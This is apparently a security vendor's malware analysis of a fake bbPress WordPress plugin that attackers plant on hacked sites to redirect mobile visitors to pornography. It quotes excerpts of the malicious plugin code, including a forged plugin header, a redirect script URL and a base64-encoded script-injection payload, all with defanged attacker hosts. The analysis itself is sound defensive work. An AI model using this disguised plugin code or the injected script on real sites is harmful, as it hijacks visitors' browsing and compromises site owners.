@@ -1,0 +1,93 @@
+Fake bb_press Plugin Redirects to Mobile Pornography
+
+When a website is hacked, we often find that attackers have injected multiple backdoors, web shells, and malicious code that allows them to regain access if the original vulnerability is patched. This allows hackers to continue abusing the website and server resources.
+One of the techniques they use is to add fake extensions that perform various malicious activities. In this note, we will give more details on an emerging malware campaign where attackers use a bogus WordPress plugin to trigger malicious redirects.
+Fake bbPress Plugin on WordPress Sites
+Attackers often try to obfuscate their attacks by imitating legitimate core files, processes, and naming conventions. This makes it more difficult for untrained webmasters to detect and remove the hack.
+The bbPress plugin is a popular legitimate forum extension for WordPress websites.  Recently we have seen attackers uploading a fake version of this plugin on compromised sites. The fake files are uploaded to the wp-content/plugins/bb_press directory.
+This bogus version triggers redirects to porn sites when the victim’s website is accessed through a mobile browser.
+How the Fake Plugin Works
+The list of files added into the directory wp-content/plugins/bb_press is as follows:
+$ find . -type d -print | xargs ls
+.:
+bb_press.php    css        img        includes    license.txt
+
+./css:
+style.css
+
+./img:
+
+./includes:
+_bb_press_plugin.class.php    config.ini            redirect_view.php
+Here is the content from the first file, bb_press.php:
+<?php
+/**
+* The bbPress Plugin
+*
+* bbPress is forum software with a twist from the creators of WordPress.
+*
+* $Id: bbpress.php 6148 2016-12-09 07:37:52Z johnjamesjacoby $
+*
+* @package bbPress
+* @subpackage Main
+*/
+
+/**
+* Plugin Name: bbPress
+* Plugin URI:  https://bbpress.org
+* Description: bbPress is forum software with a twist from the creators of WordPress.
+* Author:      The bbPress Community
+* Author URI:  https://bbpress.org
+* Version:     2.5.12
+* Text Domain: bbpress
+* Domain Path: /languages/
+*/
+if( !defined('MRT_PLG_VERS') )
+define( 'MRT_PLG_VERS', '1.44' );
+if( !defined('MRT_URL') )
+define( 'MRT_URL', plugin_dir_url( __FILE__ ) );
+
+include(dirname(__FILE__) . '/includes/_bb_press_plugin.class.php');
+register_activation_hook(__FILE__, array('bb_press', 'install')); // M
+register_deactivation_hook(__FILE__, array('bb_press', 'uninstall'));
+add_filter('plugin_action_links', array($MRT,'wp_plugin_links'), 10, 3);
+add_action('admin_head', array($MRT, 'wp_admin_head'));
+You may have noticed that the top of the file contains comments lifted from the legitimate bbPress plugin, a tactic we have seen before by attackers attempting to deceive website owners.
+Looking closer at includes/_bb_press_plugin.class.php we see:
+<?php
+if (!defined('WP_CONTENT_URL'))  define('WP_CONTENT_URL', content_url() );
+if (!defined('WP_PLUGIN_URL'))   define('WP_PLUGIN_URL', plugins_url() );
+if (!defined('WP_PLUGIN_DIR'))   define('WP_PLUGIN_DIR', plugin_dir_path(__FILE__) );
+if (!defined('WP_CONTENT_DIR'))  define('WP_CONTENT_DIR', dirname(WP_PLUGIN_DIR) );
+
+if (!class_exists('bb_press',false)):
+class bb_press {
+public static $lang = 'en';
+public static $page_title = 'bbPress is forum software';
+public static $menu_title = 'bb_press';
+public static $menu_slug = 'bb_press';
+public static $plugin_name = 'bb_press';
+public static $script_was_appended = false;
+public $has_wp_head = false;
+const SCRIPT_SRC            = 'hxxp://keit[.]staticweb[.]tk/98fPgS';
+const MRT_ALL_TRAFFIC       = 0;
+const MRT_MOBILE_TRAFFIC    = 1;
+const MRT_CARRIER_TRAFFIC   = 2;
+...
+This file is more extensive, containing several additional functions. With help of other files like includes/redirect_view.php, the resulting malicious payload causes the victim’s website to redirect to hxxp://keit[.]staticweb[.]tk/98fPgS
+SiteCheck Detects Malicious Domain keit[.]staticweb[.]tk
+If you run a scan in our SiteCheck and it returns a warning like this one, the website seems to be compromised with this fake bb_press plugin:
+
+Malware Campaign Variations
+There are newer variations of this infection, where the plugin folder name can now be called bb_press2, tamplates_wp60, wp_from_9.15, etc. These variations contain some small differences in the code. For example, the _bb_press_plugin.class.php file now encodes the SCRIPT_SRC constant as:
+const SCRIPT_SRC            =
+'data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzYyU3MyU2MyU3MiU2OSU
+3MCU3NCUyMCU3MyU3MiU2MyUzZCUyMiU2OCU3NCU3NCU3MCUzYSUyZiUyZiU2YiU2NSU2OSU3NCUyZSU3MyU
+3NCU2MSU3NCU2OSU2MyU3NyU2NSU2MiUyZSU3NCU2YiUyZiU3NCUzNiU2ZCU2MyU2ZSUzMSUyMiUzZSUzYyU
+yZiU3MyU2MyU3MiU2OSU3MCU3NCUzZScpKTs=';
+When decoded, the base64 string reveals an alternate redirect:
+document.write(unescape('<script src="hXXp://keit[.]staticweb[.]tk/t6mcn1"></script>'));
+This works similarly to the older variations – triggering unwanted redirects.
+Protect Your Site
+If your website has been infected with this malware campaign and you need help cleaning it up, let us know.
+As a rule of thumb, we always recommend keeping all software updated and removing unused components from the site. Using a file integrity monitoring system will also help you track file changes and revert unauthorized modifications before they impact your website visitors, traffic, and reputation.
